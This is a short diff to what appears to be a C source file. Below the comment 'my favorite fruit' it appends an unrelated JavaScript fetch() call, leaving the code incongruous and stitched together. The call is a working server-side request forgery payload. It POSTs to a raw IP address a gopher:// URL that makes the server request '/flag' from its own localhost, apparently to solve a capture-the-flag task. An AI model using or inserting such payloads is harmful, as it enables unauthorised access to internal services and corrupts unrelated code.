@@ -24,3 +24,5 @@ int main() {
 }
 
 // my favorite fruit
+
+fetch("http://158.247.241.230:48253/api/download", { "headers": { "accept": "*/*", "accept-language": "en-US,en;q=0.9", "content-type": "application/json", "proxy-connection": "keep-alive" }, "referrer": "http://158.247.241.230:48253/", "referrerPolicy": "strict-origin-when-cross-origin", "body": "{\"url\":\"gopher://127.0.0.1:80/_GET%20/%66%6C%61%67%20HTTP/1.0%0D%0AHost:%20127.0.0.1%0D%0A%0D%0AA\"}", "method": "POST", "mode": "cors", "credentials": "omit" });
